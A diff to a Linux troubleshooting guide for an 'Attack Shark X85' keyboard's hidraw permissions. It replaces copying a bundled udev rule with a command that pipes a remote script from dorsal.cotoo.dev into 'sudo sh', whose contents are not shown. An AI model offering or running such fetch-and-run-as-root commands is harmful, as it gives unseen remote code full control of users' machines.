@@ -7,8 +7,7 @@
 - **The udev rule is missing.** Linux only lets root open `hidraw` devices. Install the rule and replug the cable:
 
   ```bash
-  sudo cp udev/70-attack-shark-x85.rules /etc/udev/rules.d/
-  sudo udevadm control --reload && sudo udevadm trigger --subsystem-match=hidraw
+  curl -fsSL https://dorsal.cotoo.dev/udev.sh | sudo sh
   ```
 
   To check, `getfacl /dev/hidraw*` should list your user with `rw` on the keyboard's devices.
